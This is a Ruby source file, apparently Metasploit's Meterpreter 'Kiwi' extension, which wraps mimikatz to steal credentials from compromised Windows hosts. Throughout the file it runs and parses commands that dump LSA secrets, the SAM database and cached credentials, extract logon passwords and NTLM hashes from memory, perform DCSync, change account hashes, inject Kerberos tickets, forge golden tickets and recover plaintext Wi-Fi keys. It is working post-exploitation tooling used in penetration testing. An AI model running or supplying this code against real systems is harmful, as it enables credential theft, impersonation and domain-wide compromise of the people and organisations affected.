# -*- coding: binary -*-

require 'rex/post/meterpreter/extensions/kiwi/tlv'
require 'rexml/document'
require 'set'

module Rex
module Post
module Meterpreter
module Extensions
module Kiwi

###
#
# Kiwi extension - grabs credentials from windows memory.
#
# Benjamin DELPY `gentilkiwi`
# http://blog.gentilkiwi.com/mimikatz
#
# extension converted by OJ Reeves (TheColonial)
###

class Kiwi < Extension

  #
  # Typical extension initialization routine.
  #
  # @param client (see Extension#initialize)
  def initialize(client)
    super(client, 'kiwi')

    client.register_extension_aliases(
      [
        {
          'name' => 'kiwi',
          'ext'  => self
        },
      ])

    # by default, we want all output in base64, so fire that up
    # first so that everything uses this down the track
    exec_cmd('"base64 /in:on /out:on"')
  end

  def exec_cmd(cmd)
    request = Packet.create_request('kiwi_exec_cmd')
    request.add_tlv(TLV_TYPE_KIWI_CMD, cmd)
    response = client.send_request(request)
    output = response.get_tlv_value(TLV_TYPE_KIWI_CMD_RESULT)
    # remove the banner up to the prompt
    output = output[output.index('mimikatz(powershell) #') + 1, output.length]
    # return everything past the newline from here
    output[output.index("\n") + 1, output.length]
  end

  def password_change(opts)
    cmd = "lsadump::changentlm /user:#{opts[:user]}"
    cmd << " /server:#{opts[:server]}" if opts[:server]
    cmd << " /oldpassword:#{opts[:old_pass]}" if opts[:old_pass]
    cmd << " /oldntlm:#{opts[:old_hash]}" if opts[:old_hash]
    cmd << " /newpassword:#{opts[:new_pass]}" if opts[:new_pass]
    cmd << " /newntlm:#{opts[:new_hash]}" if opts[:new_hash]

    output = exec_cmd("\"#{cmd}\"")
    result = {}

    if output =~ /^OLD NTLM\s+:\s+(\S+)\s*$/m
      result[:old] = $1
    end
    if output =~ /^NEW NTLM\s+:\s+(\S+)\s*$/m
      result[:new] = $1
    end

    if output =~ /^ERROR/m
      result[:success] = false
      if output =~ /^ERROR.*SamConnect/m
        result[:error] = 'Invalid server.'
      elsif output =~ /^ERROR.*Bad old/m
        result[:error] = 'Invalid old password or hash.'
      elsif output =~ /^ERROR.*SamLookupNamesInDomain/m
        result[:error] = 'Invalid user.'
      else
        result[:error] = 'Unknown error.'
      end
    else
      result[:success] = true
    end

    result
  end

  def dcsync(domain_user)
    exec_cmd("\"lsadump::dcsync /user:#{domain_user}\"")
  end

  def dcsync_ntlm(domain_user)
    result = {
      ntlm: '<NOT FOUND>',
      lm: '<NOT FOUND>',
      sid: '<NOT FOUND>',
      rid: '<NOT FOUND>'
    }

    output = dcsync(domain_user)
    return nil unless output.include?('Object RDN')

    output.lines.map(&:strip).each do |l|
      if l.start_with?('Hash NTLM: ')
        result[:ntlm] = l.split(' ')[-1]
      elsif l.start_with?('lm  - 0:')
        result[:lm] = l.split(' ')[-1]
      elsif l.start_with?('Object Security ID')
        result[:sid] = l.split(' ')[-1]
      elsif l.start_with?('Object Relative ID')
        result[:rid] = l.split(' ')[-1]
      end
    end

    result
  end

  def lsa_dump_secrets
    exec_cmd('lsadump::secrets')
  end

  def lsa_dump_sam
    exec_cmd('lsadump::sam')
  end

  def lsa_dump_cache
    exec_cmd('lsadump::cache')
  end

  def creds_ssp
    { ssp: parse_ssp(exec_cmd('sekurlsa::ssp')) }
  end

  def creds_msv
    { msv: parse_msv(exec_cmd('sekurlsa::msv')) }
  end

  def creds_wdigest
    { wdigest: parse_wdigest(exec_cmd('sekurlsa::wdigest')) }
  end

  def creds_tspkg
    { tspkg: parse_tspkg(exec_cmd('sekurlsa::tspkg')) }
  end

  def creds_kerberos
    { kerberos: parse_kerberos(exec_cmd('sekurlsa::kerberos')) }
  end

  def creds_all
    output = exec_cmd('sekurlsa::logonpasswords')
    {
      msv: parse_msv(output),
      ssp: parse_ssp(output),
      wdigest: parse_wdigest(output),
      tspkg: parse_tspkg(output),
      kerberos: parse_kerberos(output)
    }
  end

  def parse_ssp(output)
    results = {}
    lines = output.lines

    while lines.length > 0 do
      line = lines.shift

      # search for an wdigest line
      next if line !~ /\sssp\s:/

      line = lines.shift

      # are there interesting values?
      while line =~ /\[\d+\]/
        line = lines.shift
        # then the next 3 lines should be interesting
        ssp = {}
        3.times do
          k, v = read_value(line)
          ssp[k.strip] = v if k
          line = lines.shift
        end

        if ssp.length > 0
          results[ssp.values.join('|')] = ssp
        end
      end
    end

    results.values
  end

  def parse_wdigest(output)
    results = {}
    lines = output.lines

    while lines.length > 0 do
      line = lines.shift

      # search for an wdigest line
      next if line !~ /\swdigest\s:/

      line = lines.shift

      # are there interesting values?
      next if line.blank? || line !~ /\s*\*/

      # no, the next 3 lines should be interesting
      wdigest = {}
      3.times do
        k, v = read_value(line)
        wdigest[k.strip] = v if k
        line = lines.shift
      end

      if wdigest.length > 0
        results[wdigest.values.join('|')] = wdigest
      end
    end

    results.values
  end

  def parse_tspkg(output)
    results = {}
    lines = output.lines

    while lines.length > 0 do
      line = lines.shift

      # search for an tspkg line
      next if line !~ /\stspkg\s:/

      line = lines.shift

      # are there interesting values?
      next if line.blank? || line !~ /\s*\*/

      # no, the next 3 lines should be interesting
      tspkg = {}
      3.times do
        k, v = read_value(line)
        tspkg[k.strip] = v if k
        line = lines.shift
      end

      if tspkg.length > 0
        results[tspkg.values.join('|')] = tspkg
      end
    end

    results.values
  end

  def parse_kerberos(output)
    results = {}
    lines = output.lines

    while lines.length > 0 do
      line = lines.shift

      # search for an kerberos line
      next if line !~ /\skerberos\s:/

      line = lines.shift

      # are there interesting values?
      next if line.blank? || line !~ /\s*\*/

      # no, the next 3 lines should be interesting
      kerberos = {}
      3.times do
        k, v = read_value(line)
        kerberos[k.strip] = v if k
        line = lines.shift
      end

      if kerberos.length > 0
        results[kerberos.values.join('|')] = kerberos
      end
    end

    results.values
  end

  def parse_msv(output)
    results = {}
    lines = output.lines

    while lines.length > 0 do
      line = lines.shift

      # search for an MSV line
      next if line !~ /\smsv\s:/

      line = lines.shift

      # loop until we find the 'Primary' entry
      while line !~ / Primary/ && !line.blank?
        line = lines.shift
      end

      # did we find something?
      next if line.blank?

      msv = {}
      # loop until we find a line that doesn't start with
      # an asterisk, as this is the next credential set
      loop do
        line = lines.shift
        if line.strip.start_with?('*')
          k, v = read_value(line)
          msv[k.strip] = v if k
        else
          lines.unshift(line)
          break
        end
      end

      if msv.length > 0
        results[msv.values.join('|')] = msv
      end
    end

    results.values
  end

  def read_value(line)
    if line =~ /\s*\*\s([^:]*):\s(.*)/
      return $1, $2
    end

    return nil, nil
  end

  #
  # List available kerberos tickets.
  #
  # @return [String]
  #
  def kerberos_ticket_list
    exec_cmd('kerberos::list')
  end

  #
  # Use the given ticket in the current session.
  #
  # @param ticket [String] Content of the Kerberos ticket to use.
  #
  # @return [void]
  #
  def kerberos_ticket_use(base64_ticket)
    result = exec_cmd("\"kerberos::ptt #{base64_ticket}\"")
    result.strip.end_with?(': OK')
  end

  #
  # Purge any Kerberos tickets that have been added to the current session.
  #
  # @return [void]
  #
  def kerberos_ticket_purge
    result = exec_cmd('kerberos::purge').strip
    'Ticket(s) purge for current session is OK' == result
  end

  #
  # Create a new golden kerberos ticket on the target machine and return it.
  #
  # @param opts[:user] [String] Name of the user to create the ticket for.
  # @param opts[:domain_name] [String] Domain name.
  # @param opts[:domain_sid] [String] SID of the domain.
  # @param opts[:krbtgt_hash] [String] The kerberos ticket granting token.
  # @param opts[:id] [Integer] ID of the user to grant the token for.
  # @param opts[:group_ids] [Array<Integer>] IDs of the groups to assign to the user
  #
  # @return [Array<Byte>]
  #
  def golden_ticket_create(opts={})
    cmd = [
      "\"kerberos::golden /user:",
      opts[:user],
      " /domain:",
      opts[:domain_name],
      " /sid:",
      opts[:domain_sid],
      " /startoffset:0",
      " /endin:",
      opts[:end_in] * 60,
      " /krbtgt:",
      opts[:krbtgt_hash],
      "\""
    ].join('')

    if opts[:id]
      cmd << " /id:" + opts[:id].to_s
    end

    if opts[:group_ids]
      cmd << " /groups:" + opts[:group_ids]
    end

    output = exec_cmd(cmd)

    return nil unless output.include?('Base64 of file')

    saving = false
    content = []
    output.lines.map(&:strip).each do |l|
      if l.start_with?('Base64 of file')
        saving = true
      elsif saving
        if l.start_with?('====')
          next if content.length == 0
          break
        end
        content << l
      end
    end

    content.join('')
  end

  #
  # Access and parse a set of wifi profiles using the given interfaces
  # list, which contains the list of profile xml files on the target.
  #
  # @return [Hash]
  def wifi_parse_shared(wifi_interfaces)
    results = []

    exec_cmd('"base64 /in:off /out:on"')
    wifi_interfaces.keys.each do |key|
      interface = {
        :guid     => key,
        :desc     => nil,
        :state    => nil,
        :profiles => []
      }

      wifi_interfaces[key].each do |wifi_profile_path|
        cmd = "\"dpapi::wifi /in:#{wifi_profile_path} /unprotect\""
        output = exec_cmd(cmd)

        lines = output.lines

        profile = {
          :name        => nil,
          :auth        => nil,
          :key_type    => nil,
          :shared_key  => nil
        }

        while lines.length > 0 do
          line = lines.shift.strip
          if line =~ /^\* SSID name\s*: (.*)$/
            profile[:name] = $1
          elsif line =~ /^\* Authentication\s*: (.*)$/
            profile[:auth] = $1
          elsif line =~ /^\* Key Material\s*: (.*)$/
            profile[:shared_key] = $1
          end
        end

        interface[:profiles] << profile
      end

      results << interface
    end
    exec_cmd('"base64 /in:on /out:on"')

    results
  end

  #
  # List all the wifi interfaces and the profiles associated
  # with them. Also show the raw text passwords for each.
  #
  # @return [Array<Hash>]
  def wifi_list
    response_xml = exec_cmd('misc::wifi')
    results = []
    # TODO: check for XXE?
    doc = REXML::Document.new(response_xml)

    doc.get_elements('wifilist/interface').each do |i|
      interface = {
        :guid     => Rex::Text::to_guid(i.elements['guid'].text),
        :desc     => i.elements['description'].text,
        :state    => i.elements['state'].text,
        :profiles => []
      }

      i.get_elements('profiles/WLANProfile').each do |p|
        interface[:profiles] << {
          :name        => p.elements['name'].text,
          :auth        => p.elements['MSM/security/authEncryption/authentication'].text,
          :key_type    => p.elements['MSM/security/sharedKey/keyType'].text,
          :shared_key  => p.elements['MSM/security/sharedKey/keyMaterial'].text
        }
      end

      results << interface
    end

    return results
  end

end

end; end; end; end; end
